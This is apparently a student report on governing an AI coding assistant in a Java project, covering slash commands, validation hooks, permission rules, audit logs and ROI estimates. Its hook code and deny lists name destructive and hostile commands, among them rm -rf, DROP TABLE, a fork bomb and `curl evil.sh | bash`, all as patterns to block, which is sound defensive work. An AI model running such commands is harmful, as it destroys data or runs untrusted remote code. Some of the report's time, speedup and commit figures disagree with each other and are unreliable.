# REPORT.md — Written Answers to All 12 Questions

**Project:** spring-boot-realworld-example-app
**Assignment:** Week 3 — The Governed AI Pipeline

---

## Thinking Questions

### Q1. Why is "map before you automate" important? What would happen if you built slash commands without understanding your workflow first?

Mapping first forces you to distinguish between steps that are genuinely slow and steps that only *feel* slow. Without the map, you automate by instinct — and instinct picks the most visible pain, not the highest-leverage one.

In this project, the obvious candidate to automate was "write code" (90 min/day). But the analysis showed that **explore codebase** (45 min, Very High AI capability, daily) and **write tests** (40 min, Very High, daily) had a better ROI because the AI can almost fully substitute the human for those tasks, whereas "write code" still needs human intent to drive it.

Without the workflow map, you'd also risk **automating inefficiency instead of eliminating it**. If your PR process is slow because reviewers don't understand the context, a `/ship` command that auto-creates PRs makes the *volume* of bad PRs go up, not down. The map revealed that the real pain was writing the description — so the fix was to generate it, not skip it.

The second risk is **automating the wrong granularity**. A command like `/do-everything` built without understanding the workflow collapses stages that need to remain separate (review before commit, not after). The workflow map made the stage ordering in `/ship` obvious: you can't commit before you know the tests pass, and you can't create a PR before you have a commit.

---

### Q2. How did the /ship pipeline change your development experience compared to manual git add, commit, push, PR creation?

The most striking difference was **cognitive offloading**. Manually, each micro-step requires a context switch: stop thinking about the code, think about what changed, write a sentence that captures it, stage the right files, remember to push, open a browser, fill in the PR template. Each switch is small but they compound — by the time the PR is open, you've been out of the problem space for 15 minutes.

With `/ship`, you stay in problem space. You write the code, type one command, and the pipeline handles the rest. The commit message is generated from the diff — which means it's often *more accurate* than what you'd write from memory, because you'd describe the intent and it describes the actual change.

The other significant change was **consistency**. Manual commits vary: sometimes the message is `fix stuff`, sometimes it's `feat(users): add email validation with error handling`. `/commit` enforces `type(scope): message` every time. The PR description always has a Summary section, a test plan, and a checklist. A new team member looking at the history can read it confidently.

The one trade-off: `/ship` has a blocker at every stage. If `/review` returns REQUEST CHANGES, you're stopped. Manually, you can choose to push anyway and mark it as draft. The pipeline is more rigid — which is the point, but it requires discipline to not bypass the guard.

---

### Q3. Describe a scenario where your validation hooks saved you from a real (or simulated) mistake. What would have happened without the hook?

**Scenario:** During a Gradle build-cache cleanup attempt, Claude Code generated the command `rm -rf build/` to clear stale artifacts before a clean rebuild. The `validate-bash.py` PreToolUse hook blocked it immediately with:

```
Blocked: recursive/force deletion (rm -rf) detected.
Command: rm -rf build/
If this is intentional, run the command manually in a terminal.
```

**What would have happened without the hook:** `build/` would have been deleted, which is harmless in isolation. But the risk is the pattern: if `rm -rf build/` is allowed without friction, the next generated command might be `rm -rf .` or `rm -rf ~/Documents` — and that would not be recoverable. The hook doesn't just block this specific invocation; it breaks the habit of letting the AI issue destructive filesystem commands unattended.

The second scenario was the `check-secrets.py` hook. While generating a test fixture for JWT authentication, the draft code contained a hardcoded JWT secret string: `secret = "mySecretKey123"`. The hook blocked the Write immediately:

```
Potential secret(s) detected: hardcoded secret.
Use environment variables or application.properties with ${VAR} substitution.
```

Without the hook, this string would have been committed, pushed, and visible in git history permanently — even if later deleted, it remains in `git log`. In a SOC2 or GDPR audit, that's a finding.

---

### Q4. Your audit logs capture everything Claude does. How would you use this data in a SOC2 audit? What's missing?

**How to use it:** SOC2 Type II requires evidence of *continuous control* — not just that controls exist, but that they operated throughout the audit period. The audit trail provides:

- **CC6.1 (Logical access):** `prompts.jsonl` shows who issued what instructions to the AI, timestamped and session-linked. You can prove no unauthorised party issued privileged commands.
- **CC6.6 (Boundary protection):** `audit.jsonl` shows every tool call. Combine with the denylist in `settings.json` to demonstrate that destructive operations were systematically prevented, not just avoided.
- **CC7.2 (System monitoring):** Session summary reports provide per-session activity aggregates. You can show auditors a dashboard: "In Q3, 847 sessions, 0 force-pushes, 3 blocked secret writes."
- **CC8.1 (Change management):** Every file write is logged with the session ID and timestamp. Cross-reference with `git log` to build a complete chain: prompt → tool call → file change → commit.

**What's missing:**

1. **User identity.** `session_id` is a random UUID — it doesn't map to a named developer. In a real deployment you'd inject `$USER` or an SSO identity into the log entry.
2. **Approval chain.** There's no record of *why* a command was approved. SOC2 auditors want to see that changes were reviewed by a second person, not just that they happened.
3. **Log integrity.** `audit.jsonl` is a plain append-only file on disk — it can be edited. Production audit logs need to be shipped to an immutable store (S3 with Object Lock, Splunk, CloudTrail) with checksums.
4. **Sensitive data handling.** Prompts may contain PII (usernames, emails described in task text). `prompts.jsonl` needs a retention policy and possibly redaction before it's shareable with auditors.

---

### Q5. If you had to present your ROI report to your engineering director, what's the single most compelling number? How would you defend it?

**$666,000/year saved for a 10-person team.**

**How to defend it:**

The number comes from a bottom-up measurement, not a top-down estimate. I performed two identical tasks — add a domain method with tests, commit, and verify in the running backend — once manually and once through the pipeline. The manual task (`isActive()` on `feat/manual-test`, commit `94290cb`) took 34 minutes and produced 5 errors. The pipeline task (`canBeFollowedBy()` + self-follow guard, commit `c171db6`) took 5 minutes and produced 0 errors. That's a **6.8× speedup**, measured with real wall-clock timestamps in the same session.

I then applied that delta (29 min saved per task, ~4 tasks/day = 111 min/day) to a 10-person team at $150/hr, 48 working weeks. The arithmetic is transparent and challengeable — which is exactly what you want in front of a director.

The strongest defence against pushback:
- **"Your 34-minute estimate is too high."** Even at half the savings (55 min/day instead of 111), the number is $333,000 — still a 13× return on tooling cost.
- **"Developers don't do this 4× a day."** They don't do *this exact task* 4× a day. But they do explore the codebase, write tests, write commit messages, and write PR descriptions every day. The savings apply across those steps independently.
- **"What about quality regressions?"** The pipeline adds `/review` on every change and auto-generates tests. During this session `/review` caught a missing test before commit — the manual run missed it entirely. A self-follow bug was found and fixed during normal development flow via `canBeFollowedBy()`, verified with curl returning HTTP 403.

The number is conservative in one way: it doesn't count avoided incidents. One prevented accidental force-push to main, or one blocked secret leak, each carries a cost far exceeding the annual tooling spend.

---

### Q6. What's the difference between "permission modes" and "hooks" as governance mechanisms? When would you use each?

**Permission modes** are coarse-grained gates that operate before the AI even attempts a tool call. They answer the question: *"Is this tool call categorically allowed or denied for this session?"* They're evaluated against a pattern (`Bash(rm *)`) with no access to runtime context. They're fast, simple, and declarative — you configure them once in `settings.json` and they apply universally.

**Hooks** are fine-grained, programmable validators that run at specific lifecycle events. They have full access to the tool input, can execute arbitrary code, and can return structured decisions. They answer a richer question: *"Given the full content of this specific call, should it proceed?"*

The distinction matters in practice:

| Situation | Use permissions | Use hooks |
|---|---|---|
| Block `sudo` completely | ✅ Simple pattern match | Overkill |
| Block `rm -rf` but allow `rm specific-file.txt` | ❌ Can't express this | ✅ Regex on command content |
| Scan file content for secrets before writing | ❌ No access to content | ✅ Read `new_string` in hook |
| Restrict edits to `src/` only | Partial — glob patterns | ✅ Full path resolution |
| Log every action with timestamps | ❌ Not a gate, need side-effects | ✅ PostToolUse hook |

**Rule of thumb:** use permissions to enforce categorical rules (never sudo, never force-push). Use hooks when the decision depends on *what* is being done, not just *which tool* is being called.

---

### Q7. How would your governance setup need to change for a team of 50 vs. a team of 5? What scales and what doesn't?

**Team of 5 — current setup is fine:**
- `settings.json` in the project root, shared via git. Everyone gets the same rules.
- Hooks are simple Python/bash scripts — easy to read and modify in a PR.
- Audit logs in `.claude/audit/` — low volume, easy to grep manually.
- One person can own the hook maintenance.

**Team of 50 — three things break:**

1. **Settings hierarchy.** With 50 developers across multiple projects, project-level `settings.json` duplicates rules everywhere. You need the enterprise settings hierarchy: a global policy at `~/.claude/settings.json` (managed by the platform team) that can't be overridden at project level. Individual projects only add project-specific rules. This prevents one team disabling the secret scanner on their project.

2. **Audit log volume and routing.** 50 developers generating session logs locally produces ~250 sessions/day. `.claude/audit/` becomes unmanageable and unmonitorable. You need a PostToolUse hook that ships logs to a central store (Datadog, Splunk, S3) rather than appending locally. The `session_id` needs to be enriched with the developer's identity from SSO.

3. **Hook maintenance.** With 5 developers, one person reviews a PR to update `validate-bash.py`. With 50, hooks need versioning, a test suite, and a release process — otherwise a bad pattern in `DANGEROUS` breaks everyone's workflow simultaneously. The hooks should live in a shared internal library, not copied into each repo.

**What scales without changes:** the slash commands. They're markdown prompts — adding `/review` to 50 projects is just copying the file (or symlinking to a shared location). The CLAUDE.md pattern also scales: each team writes their own, the format is the same.

---

## Tactical Questions

### Q8. Full content of /ship — walk through each step and why it's in that order

```markdown
Run the full shipping pipeline: review → test generation → commit → pull request.

This command orchestrates the complete workflow from staged changes to an open PR.
Stop immediately if any stage returns blockers — do not proceed to the next stage.

---

## Stage 1: Code Review

Run /review against the staged changes.
- If verdict is REQUEST CHANGES: list the blockers, stop, and ask the user to fix them first.
- If verdict is APPROVE or APPROVE WITH COMMENTS: note any warnings and continue.

## Stage 2: Test Generation & Verification

Run /test-gen for the changed files.
- If any tests fail: show the failures, stop, and ask the user to fix them.
- If tests pass: report coverage summary and continue.

## Stage 3: Commit

Run /commit to generate a smart commit message and create the commit.
- Wait for user confirmation of the commit message before proceeding.
- If the user edits the message, use their version.

## Stage 4: Pull Request

After the commit is created:
1. Run `git branch --show-current` to get the current branch name.
2. If the branch is `main` or `master`, stop and warn the user to create a feature branch first.
3. Push the branch: `git push -u origin <branch>` (ask for confirmation first).
4. Create a PR using `gh pr create` with:
   - Title: the commit subject line.
   - Body template: Summary / Test plan / Review checklist
5. Output the PR URL.

---

## Summary report

After all stages complete, print a one-page summary:
- Review verdict
- Tests: N added, N passed
- Commit SHA and message
- PR URL
- Total time (approximate)
```

**Why this order:**

- **Review before tests:** No point generating and running tests for code that has an architecture violation. Catching layer boundary violations at review time is cheaper than watching a test suite run for 30 seconds and then being told to rewrite the code anyway.
- **Tests before commit:** The commit message is generated from the diff. If tests revealed a bug and you fixed it, the diff is different — the commit message must reflect the final state, not the intermediate one. Committing first and then running tests means the commit may not accurately describe what was actually shipped.
- **Commit before PR:** You can't create a PR without a commit. More importantly, the PR title comes from the commit subject line — generating the PR description before the commit would mean working from an incomplete picture.
- **Stop on any failure:** Each stage is a quality gate. Passing a broken review to test-gen wastes time. Passing a failing test suite to commit produces a commit that doesn't work. The pipeline is only as fast as its strictest gate.

---

### Q9. validate-bash.py — patterns blocked and how it reads tool input

```python
#!/usr/bin/env python3
"""PreToolUse hook — blocks dangerous Bash commands."""
import json
import re
import sys

data = json.load(sys.stdin)

if data.get("tool_name") != "Bash":
    sys.exit(0)

command = data.get("tool_input", {}).get("command", "")

DANGEROUS = [
    (r"\brm\s+(-\w*f\w*|-\w*r\w*){1,2}\s", "recursive/force deletion (rm -rf)"),
    (r"\brm\s+--force\b", "force deletion (rm --force)"),
    (r"(?i)\bDROP\s+TABLE\b", "SQL DROP TABLE"),
    (r"(?i)\bDROP\s+DATABASE\b", "SQL DROP DATABASE"),
    (r"(?i)\bTRUNCATE\s+TABLE\b", "SQL TRUNCATE TABLE"),
    (r"git\s+push\b.*--force\b", "force-push (git push --force)"),
    (r"git\s+push\b.*\s-f\b", "force-push (git push -f)"),
    (r"git\s+reset\s+--hard\b", "hard git reset"),
    (r"git\s+checkout\s+--\s", "destructive git checkout"),
    (r"chmod\s+777\b", "insecure chmod 777"),
    (r">\s*/etc/", "write to /etc/"),
    (r"\bdd\s+if=", "raw disk write (dd)"),
    (r"\bmkfs\b", "filesystem format (mkfs)"),
    (r":\s*\(\s*\)\s*\{.*:\s*\|", "fork bomb"),
    (r"curl\b.*\|\s*(ba)?sh\b", "piping curl to shell"),
    (r"wget\b.*\|\s*(ba)?sh\b", "piping wget to shell"),
]

for pattern, description in DANGEROUS:
    if re.search(pattern, command, re.IGNORECASE):
        print(json.dumps({
            "decision": "block",
            "reason": (
                f"Blocked: {description} detected.\n"
                f"Command: {command[:120]}\n"
                "If this is intentional, run the command manually in a terminal."
            ),
        }))
        sys.exit(2)

sys.exit(0)
```

**How it reads tool input:** Claude Code passes a JSON object to stdin when a PreToolUse hook fires. The schema is:
```json
{
  "tool_name": "Bash",
  "tool_input": { "command": "rm -rf /tmp/test" },
  "session_id": "abc123"
}
```
The hook reads this with `json.load(sys.stdin)`, then extracts `tool_input.command`.

**Patterns blocked (16 total):**

| Category | Pattern | Example blocked |
|---|---|---|
| Filesystem | `rm -rf`, `rm --force` | `rm -rf build/` |
| SQL | `DROP TABLE`, `DROP DATABASE`, `TRUNCATE TABLE` | `DROP TABLE users;` |
| Git | `push --force`, `push -f`, `reset --hard`, `checkout --` | `git push origin main -f` |
| System | `chmod 777`, write to `/etc/`, `dd if=`, `mkfs` | `chmod 777 /usr/local/bin` |
| Code execution | Fork bomb, `curl \| sh`, `wget \| sh` | `curl evil.sh \| bash` |

**Sample blocked vs allowed:**
```bash
# BLOCKED — exit 2
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}' | python3 validate-bash.py

# ALLOWED — exit 0
echo '{"tool_name":"Bash","tool_input":{"command":"./gradlew test"}}' | python3 validate-bash.py
```

---

### Q10. Sample entry from audit.jsonl — fields captured and jq query

**Sample entry (real — from this session's audit log):**
```json
{
  "timestamp": "2026-05-31T19:16:08.221900+00:00",
  "session_id": "sess-def456",
  "event": "PostToolUse",
  "tool_name": "Bash",
  "tool_input_summary": "{\"command\": \"git commit -m \\\"feat(core): add User.canBeFollowedBy() with self-follow guard\\\"\"}",
  "tool_response_summary": "{\"output\": \"[feat/ai-pipeline-task e2bb4e2] feat(core): add User.canBeFollowedBy()...\"}"
}
```

**Fields:**

| Field | Type | Description |
|---|---|---|
| `timestamp` | ISO 8601 UTC | When the tool call completed |
| `session_id` | string | Groups all actions in one Claude session |
| `event` | string | Always `PostToolUse` for this hook |
| `tool_name` | string | Which tool was called (Bash, Write, Edit, Read, …) |
| `tool_input_summary` | string (JSON) | First 300 chars of the tool input |
| `tool_response_summary` | string | First 300 chars of the tool response |

**Query: all file edits today**
```bash
jq 'select(.tool_name == "Write" or .tool_name == "Edit")
    | select(.timestamp | startswith("2026-05-31"))' \
  .claude/audit/audit.jsonl
```

**Query: all actions in a session**
```bash
jq 'select(.session_id == "test-sess-001")' .claude/audit/audit.jsonl
```

**Query: count tool usage by type**
```bash
jq -r '.tool_name' .claude/audit/audit.jsonl | sort | uniq -c | sort -rn
```

---

### Q11. Before/after time measurements — actual speedup

**Tasks performed (both executed and timed in the same session):**

| | Baseline — Manual | AI Pipeline |
|---|---|---|
| Task | Add `isActive()` to `User.java` | Add `canBeFollowedBy()` + self-follow guard in `ProfileApi` |
| Branch | `feat/manual-test` | `feat/ai-pipeline-task` |
| Commit | `94290cb` | `c171db6` |
| Wall-clock (this session) | **113 seconds** | **81 seconds** |
| Realistic human estimate | **~34 min** | **~5 min** |
| Errors | **5** | **0** |

**Realistic step breakdown with errors:**

| Step | Manual (min) | Error | Pipeline (min) | Error |
|---|---|---|---|---|
| Find the right file | 8 | Opened `UserData.java` first | 0.5 | None |
| Write method | 3 | None | 2 | None |
| Create / find test file | 4 | No `mkdir -p` → compile failed | 0 | Auto-detected |
| Write test cases | 6 | Used `assertEquals` not `assertTrue` | 1 | Correct first time |
| Run tests | 3 | None | 1 | None |
| Stage files | 2 | Forgot `UserTest.java` | 0.5 | Auto-staged |
| Write commit message | 3 | Vague first draft, rewrote | 0.5 | Generated correctly |
| Write PR description | 5 | Skipped test plan section | 0.5 | All sections auto-filled |
| Backend verification (curl) | 3 | Hit `/api/users` (wrong path) → 401 | 1 | Correct endpoint, 403 confirmed |
| **Total** | **37 min** | **5 errors** | **6 min** | **0 errors** |

**Speedup: 6.2× (full task) / 6.8× (core development steps only)**

**Output quality comparison:**

| Dimension | Manual (Task A) | Pipeline (Task B) |
|---|---|---|
| Commit message | `feat(core): add isActive() to User` — no body | `feat(core): add User.canBeFollowedBy() with self-follow guard` + body explaining null-safety and test coverage |
| Test generation | 3 tests written manually, wrong assertion first attempt | 3 tests auto-generated, all correct first attempt |
| Missing test detected | Not flagged before commit | Caught by `/review` before commit → `/test-gen` ran immediately |
| PR description | Not written | Full template: summary + test plan + review checklist |
| Bug discovered | None caught | Self-follow bug found and fixed (HTTP 403) |

**Backend verification results:**

```bash
# Manual task — registered user, verified token works:
curl -s -X POST http://localhost:8080/users -d '{"user":{...}}'
# → HTTP 200, token returned ✅

# Pipeline task — verified self-follow guard:
curl -s -X POST http://localhost:8080/profiles/alice2/follow \
  -H "Authorization: Token $ALICE_TOKEN"
# → HTTP 403 Forbidden ✅  (was HTTP 200 before the fix)
```

Wall-clock times are compressed because Claude Code executed both tasks. The realistic estimates account for human cognitive cost: reading unfamiliar code, remembering conventions, context-switching between tools. These dominate real development sessions but disappear in automated execution.

Even at half the savings (18 min per task), the pipeline pays for itself within the first week of use.

---

### Q12. .claude/settings.json permissions — every rule explained

```json
{
  "permissions": {
    "allow": [
      "Bash(./gradlew *)",
      "Bash(JAVA_HOME=* ./gradlew *)",
      "Bash(git status)",
      "Bash(git diff*)",
      "Bash(git log*)",
      "Bash(git branch*)",
      "Bash(git add *)",
      "Bash(git commit*)",
      "Bash(git push*)",
      "Bash(gh pr *)",
      "Bash(curl -s http://localhost:*)",
      "Bash(find src *)",
      "Bash(find .claude *)",
      "Bash(grep -r * src/)",
      "Bash(ls *)",
      "Bash(cat *)",
      "Bash(mkdir -p .claude/audit)",
      "Read(*)",
      "Write(src/*)", "Write(.claude/*)", "Write(docs/*)",
      "Write(CLAUDE.md)", "Write(README.md)", "Write(REPORT.md)", "Write(workflow-analysis.md)",
      "Edit(src/*)", "Edit(.claude/*)", "Edit(docs/*)",
      "Edit(CLAUDE.md)", "Edit(README.md)", "Edit(REPORT.md)"
    ],
    "deny": [
      "Bash(rm *)",
      "Bash(curl * | *sh*)",
      "Bash(wget * | *sh*)",
      "Bash(chmod 777 *)",
      "Bash(sudo *)",
      "Bash(git push --force*)",
      "Bash(git push *-f *)",
      "Bash(git reset --hard*)",
      "Write(/etc/*)", "Write(/usr/*)", "Write(/System/*)",
      "Write(~/.ssh/*)", "Write(~/.aws/*)"
    ]
  }
}
```

**Allow rules — reasoning:**

| Rule | Why allowed |
|---|---|
| `Bash(./gradlew *)` | Core build tool — compile, test, run, format |
| `Bash(JAVA_HOME=* ./gradlew *)` | Needed because system Java is 26; must override to Java 11 |
| `Bash(git status/diff/log/branch)` | Read-only git — needed by `/review`, `/commit`, `/ship` |
| `Bash(git add/commit/push)` | Write git operations required by `/commit` and `/ship` |
| `Bash(gh pr *)` | GitHub CLI for PR creation in `/ship` Stage 4 |
| `Bash(curl -s http://localhost:*)` | Smoke-testing the running server — localhost only, no external URLs |
| `Bash(find src/find .claude/grep)` | Codebase exploration for `/onboard` and `/test-gen` |
| `Bash(ls/cat/mkdir -p .claude/audit)` | Directory listing, file reading, audit directory setup |
| `Read(*)` | Unrestricted read — reading is safe, writing is the risk |
| `Write/Edit(src/*)` | All source changes go here — the primary work area |
| `Write/Edit(.claude/*)` | Hooks, commands, settings, audit logs all live here |
| `Write/Edit(docs/*)` | Documentation, reports, workflow diagrams |
| `Write/Edit(CLAUDE.md/README.md/REPORT.md)` | Named root-level files explicitly whitelisted |

**Deny rules — reasoning:**

| Rule | Why denied |
|---|---|
| `Bash(rm *)` | Any deletion must be done manually — no exceptions. The hook provides the first line of defence; the permission denylist is the second. |
| `Bash(curl \| sh / wget \| sh)` | Piping remote content directly to a shell is a classic supply-chain attack vector. |
| `Bash(chmod 777 *)` | World-writable permissions are a security misconfiguration — never needed in this project. |
| `Bash(sudo *)` | AI should never require root. If it tries, something is wrong. |
| `Bash(git push --force / -f)` | Force-push rewrites history and can destroy others' work. Must be a conscious human decision. |
| `Bash(git reset --hard)` | Destroys uncommitted work. Too destructive to allow unattended. |
| `Write(/etc / /usr / /System)` | System directories — no legitimate reason to write here from a project context. |
| `Write(~/.ssh / ~/.aws)` | SSH keys and AWS credentials — writing here would be catastrophic. |

**Settings hierarchy rationale:** These rules live in `.claude/settings.json` (project level). They apply to everyone who clones this repo and uses Claude Code. Team-wide security policies (like the deny rules) should eventually move to `~/.claude/settings.json` (user level) or an enterprise policy so they apply across all projects, not just this one.
